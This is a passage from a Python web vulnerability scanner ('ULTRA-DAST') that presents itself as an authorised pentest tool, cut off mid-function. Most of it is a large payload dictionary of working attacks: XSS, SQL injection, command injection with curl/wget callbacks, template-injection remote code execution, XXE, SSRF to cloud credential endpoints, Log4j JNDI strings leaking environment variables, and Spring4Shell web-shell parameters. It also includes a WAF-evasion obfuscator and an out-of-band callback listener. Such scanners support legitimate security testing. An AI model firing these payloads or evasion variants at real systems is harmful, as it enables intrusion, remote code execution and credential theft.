#!/usr/bin/env python3
"""
ULTRA-DAST v11.9 – The Unstoppable Pentester Platform
Full implementation with async engine, advanced evasion, second-order injection,
race conditions, request smuggling, WebSocket/gRPC fuzzing, CVSS 4.0, Burp XML,
JIRA/Slack alerts, multi‑tab GUI, proxy mode, FP learning, and more.

Install:
    pip install aiohttp beautifulsoup4 selenium pyyaml graphql-core pyjwt
    pip install dnspython html5lib websockets grpcio grpcio-reflection cvss PyQt5 reportlab
    ChromeDriver must be in PATH.

Authorised use only. Unauthorised scanning is illegal.
"""

import asyncio
import sys, os, json, re, time, uuid, base64, hashlib, threading, copy, random, statistics, logging, sqlite3
import ssl
import ipaddress
import binascii  # ADDED for JWT decode error handling
from datetime import datetime
from collections import defaultdict, deque
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor
from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess
import platform
from logging.handlers import RotatingFileHandler
from typing import Dict, List, Optional, Any, Set, Tuple, Union, Callable, Pattern
import warnings
import hmac
import secrets

import aiohttp
from bs4 import BeautifulSoup
import jwt as pyjwt
import json

try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    from graphql import build_client_schema, get_introspection_query, GraphQLSchema, is_input_type
    GRAPHQL_AVAILABLE = True
except ImportError:
    GRAPHQL_AVAILABLE = False

try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False

try:
    import grpc
    from grpc_reflection.v1alpha import reflection_pb2_grpc, reflection_pb2
    GRPC_AVAILABLE = True
except ImportError:
    GRPC_AVAILABLE = False

try:
    from cvss import CVSS4
    CVSS_AVAILABLE = True
except ImportError:
    CVSS_AVAILABLE = False
    logging.warning("CVSS library not available - CVSS scoring will be disabled")

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoAlertPresentException, WebDriverException

import html5lib

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QSpinBox, QDoubleSpinBox, QPushButton,
    QTextEdit, QProgressBar, QStatusBar, QFileDialog, QMessageBox,
    QFormLayout, QCheckBox, QTabWidget, QGridLayout, QTableWidget, QTableWidgetItem, QHeaderView,
    QDialog, QDialogButtonBox, QPlainTextEdit, QAction, QToolBar, QComboBox, QMenu, QMenuBar
)
from PyQt5.QtCore import QThread, pyqtSignal, QObject, Qt
from PyQt5.QtGui import QFont, QSyntaxHighlighter, QTextCharFormat, QColor, QTextDocument

# ---------------------------------------------------------------------
# CONSTANTS
# ---------------------------------------------------------------------
LEGAL_BANNER = """
 ██████╗██╗   ██╗██████╗ ███████╗██████╗        ██╗ ██╗   ██╗██╗     ██╗██╗   ██╗
██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗       ██║ ██║   ██║██║     ██║██║   ██║
██║     ██║   ██║██████╔╝█████╗  ██████╔╝       ██║ ██║   ██║██║     ██║██║   ██║
██║     ██║   ██║██╔══██╗██╔══╝  ██╔══██╗  ██   ██║ ██║   ██║██║     ██║██║   ██║
╚██████╗╚██████╔╝██║  ██║███████╗██║  ██║  ╚█████╔╝ ╚██████╔╝███████╗██║╚██████╔╝
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚════╝   ╚═════╝ ╚══════╝╚═╝ ╚═════╝
 *** UNAUTHORIZED USE IS A FEDERAL CRIME ***
"""

# Security configuration
DISABLE_SSL_VERIFICATION = False  # Set to True only for testing with explicit consent
OOB_AUTH_TOKEN = secrets.token_hex(32)  # Generate secure auth token for OOB services
OOB_AUTH_HEADER = "X-OOB-Auth"

# SSL context creation with proper verification
def create_ssl_context(verify=True):
    """Create SSL context with configurable verification. Defaults to secure."""
    context = ssl.create_default_context()
    if not verify:
        if DISABLE_SSL_VERIFICATION:
            warnings.warn(
                "SSL/TLS verification is DISABLED. This makes connections vulnerable to MITM attacks. "
                "Only use for authorized testing in isolated environments.",
                SecurityWarning
            )
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        else:
            logging.warning("SSL verification requested to be disabled but not allowed. Using secure defaults.")
    return context

class SecurityWarning(Warning):
    """Custom warning for security-related issues."""
    pass

REQUEST_TIMEOUT = 10
DEFAULT_DEPTH = 3
DEFAULT_THREADS = 100
DEFAULT_DELAY = 0.0
DEFAULT_CONFIDENCE_THRESHOLD = 75
DEFAULT_VALIDATION_ENABLED = True  # Enable 3x validation and remediation testing by default

# OOB marker constants for payload substitution
OOB_MARKER = "OOB_MARKER"
OOB_DNS = "OOB_DNS"

CWE_MAP = {
    "XSS": "CWE-79", "DOM XSS": "CWE-79", "Blind XSS": "CWE-79",
    "SQLi": "CWE-89", "PathTraversal": "CWE-22", "CommandInjection": "CWE-78",
    "OpenRedirect": "CWE-601", "SSTI": "CWE-1336", "XXE": "CWE-611",
    "CRLF": "CWE-93", "SSRF": "CWE-918", "Blind SSRF": "CWE-918",
    "NoSQLi": "CWE-943", "LDAPi": "CWE-90",
    "IDOR": "CWE-639", "MassAssignment": "CWE-915",
    "SecurityMisconfig": "CWE-16", "SensitiveDataExposure": "CWE-200",
    "InsecureDeserialization": "CWE-502", "LogInjection": "CWE-117",
    "CSRF": "CWE-352", "JWT": "CWE-347", "CORS": "CWE-942", "GraphQL": "CWE-200",
    "RequestSmuggling": "CWE-444", "CL.0 Bypass": "CWE-444", "HTTP/2 Downgrade": "CWE-444", "HTTP/2 Protocol Confusion": "CWE-444",
    "Log4j": "CWE-502", "WebSocket": "CWE-79",
    "gRPC": "CWE-200", "RaceCondition": "CWE-689", "IntegerOverflow": "CWE-190",
    "Spring4Shell": "CWE-94", "Text4Shell": "CWE-94", "Polyglot": "CWE-79",
}

# Extensive payloads
PAYLOADS = {
    "XSS": [
        "<script>alert(document.domain)</script>",
        '"><img src=x onerror=alert(1)>',
        "<svg/onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        f"<img src=http://{OOB_MARKER}>",
        f"fetch('http://{OOB_MARKER}')",
        f"new Image().src='http://{OOB_MARKER}'",
    ],
    "SQLi": [
        "' OR '1'='1",
        "1' AND 1=1-- -",
        "'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "' UNION SELECT NULL--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)--",
        f"1' AND LOAD_FILE(concat('\\\\',(SELECT database()),'.{OOB_DNS}\\test'))--",
        "' ORDER BY 1--",
    ],
    "PathTraversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
        "/etc/passwd%00.html",
        "../../WEB-INF/web.xml",
        "../../.env",
        "../../application.properties",
        "/boot.ini",
    ],
    "CommandInjection": [
        ";id",
        "|whoami",
        "&&dir",
        ";cat /etc/passwd",
        f"||ping -c 5 {OOB_DNS}",
        f"||nslookup {OOB_DNS}",
        f"||curl {OOB_MARKER}",
        f"||wget -q -O- {OOB_MARKER}",
    ],
    "OpenRedirect": ["//evil.com", "https://evil.com"],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self}}",
        "${product}",
        "{{7*'7'}}",
        # Freemarker
        "${'freemarker.template.utility.Execute'?new()(\"id\")}",
        "${@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream())}",
        # Velocity
        "#set($x='')##set($x=$x.class.forName('java.lang.Runtime'))##set($rt=$x.getRuntime())##set($proc=$rt.exec('id'))##$proc.waitFor()#set($out=$proc.getInputStream())#set($str=$x.class.forName('java.io.InputStreamReader').newInstance($out))#set($char=$x.class.forName('java.io.BufferedReader').newInstance($str))#set($line=$char.readLine())#$line",
        # Pebble
        "{{'a'.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}}",
        # Jinja2
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        # Smarty
        "{php}system('id');{/php}",
        "{if phpinfo()}{/if}",
        # Mako
        "<%import os%>${os.popen('id').read()}",
        # ERB (Ruby)
        "<%= system('id') %>",
        "<%= IO.popen('id').read %>",
    ],
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        f'<!DOCTYPE replace [<!ENTITY % remote SYSTEM "http://{OOB_MARKER}"> %remote;]>',
        f'<!DOCTYPE replace [<!ENTITY % dtd SYSTEM "http://{OOB_MARKER}/evil.dtd"> %dtd;]>',
    ],
    "CRLF": ["test%0d%0aSet-Cookie:crlf=injection"],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/",
        f"http://{OOB_MARKER}",
        "http://127.0.0.1:22",
        "gopher://127.0.0.1:6379/_INFO",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    "NoSQLi": [
        '{"$ne":""}',
        "'; return true;//",
        '{"$regex":".*"}',
        '{"$where": "1==1"}',
        '{"$or": [{"foo":"bar"},{"foo":"bar"}]}',
    ],
    "LDAPi": [
        "*)(uid=*))(|(uid=*",
        "*(uid=*)",
        "(&(uid=*)(password=*))",
        "(!(uid=*))",
    ],
    "InsecureDeserialization": [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLzUmwMAAHhwdwQAAAAAeA==",
        'O:8:"stdClass":1:{s:5:"shell";s:2:"id";}',
        "AAEAAAD/////AQAAAAAAAAAMAgAAAE5pY2tHYXZlIQ==",
        # Sleep-based confirmation payloads
        "rO0ABXNyABNqYXZhLnV0aWwuU2xlZXAAAFdJAAAEAAABCAAAAAANdAAKc2xlZXBUaW1ldAAJTGphdmEvbGFuZy9Mb25nO3h4cgATamF2YS5sYW5nLk51bWJlci5OdW1iZXJIVGJyAAl2YWx1ZXhyABdqYXZhLmxhbmcuTnVtYmVyLk51bWJlckdldGJyAAl2YWx1ZXhyABFqYXZhLmxhbmcuTnVtYmVyLnhyAC5qYXZhLmxhbmcuSW50ZWdlci54cgAOamF2YS5sYW5nLk51bWJlci54cAAAAAABAAAAAHQABDUwMDB4",
        "aced0005737200176a6176612e7574696c2e5072696f72697479717565756594da30b4fb3f101b00000078707704000000005000",  # Java PriorityQueue with sleep
        "O:12:\"DateTime\":2:{s:4:\"date\";s:19:\"2024-01-01 00:00:00\";s:4:\"tz\";s:3:\"UTC\";}",  # PHP DateTime
        "a:1:{i:0;O:8:\"stdClass\":0:{}}",  # PHP object injection
        # Python pickle sleep gadgets
        "gASVAAAAAAAAAAABlCiMBG5hdG9yZ2VzL3N5c3RlbQpxAAoJAV9fZ2V0YXR0cl9fCnUAAHRpbWVzcGVlcnEBTihOamF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoInNsZWVwIDUiKQpxA1Uu",  # Python pickle with sleep
    ],
    "LogInjection": ["%0d%0aINJECTED"],
    "MassAssignment": [
        {"role": "admin", "isAdmin": "true", "debug": "1"},
        {"is_admin": "1", "access_level": "99"},
    ],
    "Log4j": [
        "${jndi:ldap://OOB_MARKER}",
        "${jndi:dns://OOB_DNS}",
        "${${lower:j}ndi:${lower:l}dap://OOB_MARKER}",
        "${jndi:rmi://OOB_MARKER/exploit}",
        "${jndi:ldap://OOB_MARKER:1389/exploit}",
        "${jndi:rmi://OOB_DNS:1099/exploit}",
        # Obfuscated variants
        "${${::-j}ndi:${::-l}dap://OOB_MARKER}",
        "${${lower:j}ndi:${lower:l}dap://${lower:o}ob_marker}",
        "${${upper:j}ndi:${upper:l}dap://OOB_MARKER}",
        "${${env:BARFOO:-j}ndi:${env:BARFOO:-l}dap://OOB_MARKER}",
        "${${date:yyyy}MM${date:dd}:-j}ndi:${${date:yyyy}MM${date:dd}:-l}dap://OOB_MARKER}",
        # Class loading variants
        "${jndi:ldap://OOB_MARKER/ClassName}",
        "${jndi:rmi://OOB_MARKER/ClassName}",
        # Environment variable extraction
        "${jndi:ldap://OOB_MARKER/${env:USER}}",
        "${jndi:rmi://OOB_MARKER/${env:PATH}}",
    ],
    "Polyglot": [
        # XSS + SQLi polyglots
        "1' OR '1'='1'-- <script>alert(1)</script>",
        "' OR 1=1--\"><script>alert(1)</script>",
        "1' UNION SELECT '<script>alert(1)</script>'--",
        "'; DROP TABLE users-- <img src=x onerror=alert(1)>",
        # Multi-context polyglots
        "' OR 1=1#\"><script>alert(1)</script>",
        "1' OR '1'='1'/* */<script>alert(1)</script>",
        # Template injection + XSS
        "{{7*7}}<script>alert(1)</script>",
        "${7*7}<img src=x onerror=alert(1)>",
        # Command injection + XSS
        ";id\"><script>alert(1)</script>",
        "|whoami<svg/onload=alert(1)>",
    ],
    "Spring4Shell": [
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20java.lang.String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        # Simplified Spring4Shell payloads
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=hello",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt",
    ],
    "Text4Shell": [
        "${script:javascript:java.lang.Runtime.exec('calc')}",
        "${script:js:java.lang.Runtime.exec('id')}",
        f"${{dns:{OOB_DNS}}}",
        f"${{url:ftp://{OOB_MARKER}}}",
        "${env:USER}",
        "${env:PATH}",
        "${env:JAVA_HOME}",
    ],
    "RequestSmuggling": {
        "CL_TE": {"Content-Length": "6", "Transfer-Encoding": "chunked\r\n0\r\n\r\nG"},
        "TE_CL": {"Transfer-Encoding": "chunked", "Content-Length": "5\r\n0\r\n\r\nX"},
        "CL.0": {"Content-Length": "0"},
    },
    "WebSocket": [
        "<script>alert(1)</script>",
        '{"key":"value"}',
        "'; DROP TABLE users; --",
        # Binary fuzzing patterns
        "\x00\x01\x02\x03\x04\x05",
        "\xff\xfe\xfd\xfc\xfb\xfa",
        "\x7f\x7e\x7d\x7c\x7b\x7a",
        # JSON structure fuzzing
        '{"nested": {"deep": {"value": "test"}}}',
        '{"array": [1,2,3,4,5]}',
        '{"null": null, "bool": true, "num": 123.45}',
        '{"escaped": "\\"quoted\\""}',
        '{"unicode": "\\u0041\\u0042\\u0043"}',
        # Protocol-specific fuzzing
        '{"command": "subscribe", "channel": "test"}',
        '{"action": "message", "data": "<script>alert(1)</script>"}',
        '{"type": "request", "id": 1, "method": "test"}',
        # Large payload testing
        '{"large": "' + 'A' * 10000 + '"}',
        # Malformed JSON
        '{"unclosed": "value"',
        '{"duplicate": "value1", "duplicate": "value2"}',
        '{"recursive": {"value": {"recursive": {"value": "test"}}}}',
    ],
    "gRPC": [
        # Binary fuzzing patterns for protobuf
        "\x00\x00\x00\x00\x00",
        "\xff\xff\xff\xff\xff",
        "\x00\x01\x00\x02\x00\x03",
        # Malformed protobuf-like data
        "\x08\x01\x12\x03\x61\x62\x63",
        "\x0a\x05\x68\x65\x6c\x6c\x6f",
        # Large field numbers
        "\x80\x01\x01",
        "\xff\x01\x01",
        # Invalid wire types
        "\x08\x01\x09\x02",
        "\x0d\x01\x0e\x02",
        # Recursive structures
        "\x0a\x04\x0a\x02\x08\x01",
        # String injection in protobuf
        b"\x0a\x0c" + "<script>alert(1)</script>".encode(),
        b"\x12\x0c" + "' OR 1=1--".encode(),
    ],
    "Cloud": [
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    ],
    "Kubernetes": [
        "http://localhost:10255/pods",
        "http://127.0.0.1:10250/healthz",
    ],
    "RaceCondition": [],
    "IntegerOverflow": ["-1", "0", "9999999999", "1e309"],
    "JWT": [
        # Algorithm confusion test tokens
        "eyJhbGciOiJBMjU2RiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        # kid header manipulation
        "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.qH7K8P5dR9sT2nW3mY4vX6zJ8cL1fN0pG3hR5sT2nW",
        # None algorithm
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
        # Empty algorithm
        "eyJhbGciOiIiLCJ0eXBlIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
    ],
}

SQL_ERROR_PATTERN = re.compile(
    r"SQL syntax|MySQL|ORA-\d{5}|PostgreSQL|SQLite|Microsoft OLE DB|"
    r"ODBC Driver|Unclosed quotation|Warning.*mysql_|valid MySQL result|"
    r"on line \d+|Incorrect syntax near", re.IGNORECASE
)

def detect_sqli_error_ast(html: str) -> bool:
    """
    AST-based SQL error detection using tokenization.
    Detects structural patterns in error stacks instead of brittle regex.
    More robust against custom error pages.
    """
    import re
    from collections import Counter
    
    # Tokenize the HTML into meaningful chunks
    # Split on common delimiters while preserving SQL keywords
    tokens = re.findall(r'\b\w+\b|[\'"<>]|[\d,.;:()]', html, re.IGNORECASE)
    
    # SQL error structural indicators
    sql_keywords = {'sql', 'mysql', 'postgresql', 'sqlite', 'oracle', 'mssql', 
                    'syntax', 'error', 'warning', 'exception', 'query', 'statement',
                    'near', 'line', 'column', 'unexpected', 'token', 'quoted'}
    
    # Database-specific error patterns
    db_patterns = {
        'mysql': {'mysql', '1064', '1065', '1146', 'syntax', 'near'},
        'postgres': {'postgresql', 'postgres', 'syntax', 'error', 'line'},
        'oracle': {'ora-', 'oracle', 'pls-', 'error'},
        'sqlite': {'sqlite', 'syntax', 'near'},
        'mssql': {'microsoft', 'ole db', 'odbc', 'sql server'}
    }
    
    # Count keyword occurrences
    token_lower = [t.lower() for t in tokens]
    keyword_counts = Counter(token_lower)
    
    # Check for structural error patterns
    sql_keyword_score = sum(keyword_counts.get(k, 0) for k in sql_keywords)
    
    # Look for error stack structure: [DB_TYPE] + [ERROR] + [LOCATION]
    has_db_type = any(db in token_lower for db in {'mysql', 'postgresql', 'sqlite', 'oracle', 'mssql', 'sql'})
    has_error_word = any(err in token_lower for err in {'error', 'warning', 'exception', 'syntax'})
    has_location = any(loc in token_lower for loc in {'line', 'column', 'near', 'at'})
    
    # Structural pattern: database error message
    if has_db_type and has_error_word:
        return True
    
    # Check for specific database error signatures
    for db_name, pattern_set in db_patterns.items():
        if sum(keyword_counts.get(p, 0) for p in pattern_set) >= 2:
            return True
    
    # Fallback: if enough SQL-related keywords appear together
    if sql_keyword_score >= 3:
        return True
    
    return False

PASSWD_PATTERN = re.compile(r"root:x:0:0|daemon:x:1:1|root:.*:0:", re.I)
COMMAND_PATTERN = re.compile(r"uid=\d+|gid=\d+|groups=|Volume Serial Number|Directory of ", re.I)
AWS_META_PATTERN = re.compile(r"(ami-id|instance-id|public-keys|security-credentials)", re.I)

# Cache for obfuscated payloads to avoid recomputation
_obfuscation_cache = {}

def obfuscate(payload, context="param"):
    cache_key = (payload, context)
    if cache_key in _obfuscation_cache:
        return _obfuscation_cache[cache_key]
    
    # Use generator to lazily compute variants only when needed
    def generate_variants():
        yield payload
        
        # Double URL encoding (%2527 instead of %27)
        yield quote(payload, safe='')
        yield quote(quote(payload, safe=''), safe='')
        
        # Case randomization (mixed case: sElEcT, aLeRt)
        def randomize_case(text):
            return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
        
        if "SELECT" in payload.upper() or "ALERT" in payload.upper() or "UNION" in payload.upper():
            yield randomize_case(payload)
            yield payload.upper()
            yield payload.lower()
        
        # Comments insertion (S/**/EL/**/ECT)
        if " " in payload:
            yield payload.replace(" ", "/**/")
        
        # Unicode normalization (fullwidth characters)
        def to_fullwidth(text):
            result = []
            for c in text:
                code = ord(c)
                if 33 <= code <= 126:  # ASCII printable range
                    result.append(chr(code + 0xFEE0))  # Convert to fullwidth
                else:
                    result.append(c)
            return ''.join(result)
        
        yield to_fullwidth(payload)
        
        # Tab/Newline injection (%0a, %09 between keywords)
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE", "DROP", "alert", "script"]
        for keyword in keywords:
            if keyword in payload.upper():
                yield payload.replace(keyword, keyword[0] + "%09" + keyword[1:])
                yield payload.replace(keyword, keyword[0] + "%0a" + keyword[1:])
                break
        
        # JSON Unicode escape (\u0027 for single quote)
        def json_unicode_escape(text):
            result = []
            for c in text:
                if c == "'":
                    result.append("\\u0027")
                elif c == '"':
                    result.append("\\u0022")
                elif ord(c) < 32 or ord(c) > 126:
                    result.append(f"\\u{ord(c):04x}")
                else:
                    result.append(c)
            return ''.join(result)
        
        if context == "json":
            yield json_unicode_escape(payload)
        
        # HTML entity encoding
        html_entity = ''.join(f"&#{ord(c)};" for c in payload)
        yield html_entity
        
        # Standard Unicode escape
        unicode_escaped = ''.join(f"\\u{ord(c):04x}" for c in payload)
        yield unicode_escaped
        
        # Triple URL encoding
        yield quote(quote(quote(payload, safe=''), safe=''))
        
        # Null byte injection
        yield payload.replace(" ", " %00")
        
        # Combine techniques (Comment + Double-Encoding)
        if " " in payload:
            comment_variant = payload.replace(" ", "/**/")
            yield quote(comment_variant, safe='')
            yield quote(quote(comment_variant, safe=''), safe='')
        
        # Combine Case Randomization + Comments
        if "SELECT" in payload.upper() and " " in payload:
            mixed_case = randomize_case(payload)
            yield mixed_case.replace(" ", "/**/")
        
        # Combine Unicode + Tab injection
        if "SELECT" in payload.upper():
            fullwidth = to_fullwidth(payload)
            for keyword in keywords:
                if keyword in payload.upper():
                    yield fullwidth.replace(keyword.upper(), keyword.upper()[0] + "%09" + keyword.upper()[1:])
                    break
    
    # Cache the result as a list
    variants = list(set(generate_variants()))
    _obfuscation_cache[cache_key] = variants
    return variants

# ---------------------------------------------------------------------
# INPUT VALIDATION
# ---------------------------------------------------------------------
def validate_ip_address(ip_str):
    """Validate IP address format (IPv4 and IPv6)"""
    import ipaddress
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def validate_domain(domain_str):
    """Validate domain name format"""
    if not domain_str:
        return False
    # Basic domain validation
    domain_pattern = re.compile(
        r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    )
    return bool(domain_pattern.match(domain_str))

def validate_oob_config(oob_ip, oob_dns_domain):
    """Validate OOB IP and DNS configuration before scan starts"""
    errors = []
    
    if oob_ip and not validate_ip_address(oob_ip):
        errors.append(f"Invalid OOB IP address: {oob_ip}")
    
    if oob_dns_domain and not validate_domain(oob_dns_domain):
        errors.append(f"Invalid OOB DNS domain: {oob_dns_domain}")
    
    if errors:
        for error in errors:
            logging.error(error)
        return False
    
    logging.info(f"OOB configuration validated: IP={oob_ip}, DNS={oob_dns_domain}")
    return True

# ---------------------------------------------------------------------
# CHROME VERSION CHECK
# ---------------------------------------------------------------------
def get_chrome_version():
    """Get installed Chrome browser version"""
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ['reg', 'query', 'HKEY_CURRENT_USER\\Software\\Google\\Chrome\\BLBeacon', '/v', 'version'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                version = result.stdout.split()[-1]
                return version
        elif platform.system() == "Darwin":  # macOS
            result = subprocess.run(
                ['/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', '--version'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                version = result.stdout.split()[-1]
                return version
        elif platform.system() == "Linux":
            result = subprocess.run(
                ['google-chrome', '--version'],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0:
                version = result.stdout.split()[-1]
                return version
    except Exception as e:
        logging.warning(f"Failed to get Chrome version: {e}")
    return None

def check_chromedriver_compatibility():
    """Check ChromeDriver version compatibility with Chrome"""
    chrome_version = get_chrome_version()
    if not chrome_version:
        logging.warning("Could not determine Chrome version. ChromeDriver compatibility unknown.")
        return True
    
    try:
        from selenium import __version__ as selenium_version
        result = subprocess.run(
            ['chromedriver', '--version'],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0:
            chromedriver_version = result.stdout.split()[1]
            chrome_major = chrome_version.split('.')[0]
            chromedriver_major = chromedriver_version.split('.')[0]
            
            if chrome_major != chromedriver_major:
                logging.warning(
                    f"Chrome version mismatch detected: Chrome {chrome_version} vs ChromeDriver {chromedriver_version}. "
                    f"Major versions differ ({chrome_major} vs {chromedriver_major}). Selenium may not work correctly."
                )
                return False
            else:
                logging.info(f"Chrome version check passed: Chrome {chrome_version}, ChromeDriver {chromedriver_version}")
                return True
    except Exception as e:
        logging.warning(f"ChromeDriver version check failed: {e}")
    
    return True

# ---------------------------------------------------------------------
# OOB SERVER & DNS CALLBACK
# ---------------------------------------------------------------------
oob_results = []
oob_results_lock = threading.Lock()

class PortAllocator:
    """Manage port allocation to avoid conflicts in multi-tab scenarios"""
    _used_ports = set()
    _lock = threading.Lock()
    
    @classmethod
    def get_available_port(cls, preferred_port=None):
        """Get an available port, preferring the specified port if available"""
        with cls._lock:
            if preferred_port and preferred_port not in cls._used_ports:
                cls._used_ports.add(preferred_port)
                return preferred_port
            
            # Try random ports in the ephemeral range (49152-65535)
            import socket
            for _ in range(100):  # Try 100 times
                port = random.randint(49152, 65535)
                if port not in cls._used_ports:
                    # Verify port is actually available
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.bind(('0.0.0.0', port))
                            cls._used_ports.add(port)
                            return port
                    except OSError:
                        continue
            
            # Fallback to OS-assigned port
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('0.0.0.0', 0))
                port = s.getsockname()[1]
                cls._used_ports.add(port)
                return port
    
    @classmethod
    def release_port(cls, port):
        """Release a port back to the available pool"""
        with cls._lock:
            cls._used_ports.discard(port)

class OOBCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        with oob_results_lock:
            oob_results.append({
                'path': self.path,
                'source': self.client_address[0],
                'time': datetime.now().isoformat()
            })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        with oob_results_lock:
            oob_results.append({
                'path': self.path,
                'source': self.client_address[0],
                'time': datetime.now().isoformat(),
                'method': 'POST',
                'body': body.decode('utf-8', errors='ignore')[:500]
            })
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        pass

def start_oob_server(bind="127.0.0.1", preferred_port=None):
    """Start OOB server with port allocation to avoid conflicts"""
    port = PortAllocator.get_available_port(preferred_port)
    server = HTTPServer((bind, port), OOBCallbackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, port

# ---------------------------------------------------------------------
# SMTP/Email OOB CALLBACK LISTENER
# ---------------------------------------------------------------------
smtp_oob_results = []
smtp_oob_lock = threading.Lock()

class SMTPOOBHandler:
    """Handle SMTP callbacks for email-based OOB testing"""
    
    def __init__(self, bind="127.0.0.1", port=2525):
        self.bind = bind
        self.port = port
        self.server = None
        self.thread = None
    
    def handle_smtp(self, data, client_addr):
        """Parse incoming SMTP data for OOB markers"""
        try:
            decoded = data.decode('utf-8', errors='ignore')
            with smtp_oob_lock:
                smtp_oob_results.append({
                    'data': decoded[:1000],
                    'source': client_addr[0],
                    'time': datetime.now().isoformat()
                })
            logging.info(f"SMTP OOB callback from {client_addr[0]}")
        except Exception as e:
            logging.warning(f"SMTP parsing error: {e}")
    
    def start(self):
        """Start SMTP server for OOB callbacks"""
        try:
            import socket
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.bind, self.port))
            self.server.listen(5)
            
            def smtp_listener():
                while True:
                    try:
                        conn, addr = self.server.accept()
                        data = conn.recv(4096)
                        if data:
                            self.handle_smtp(data, addr)
                            # Send basic SMTP response
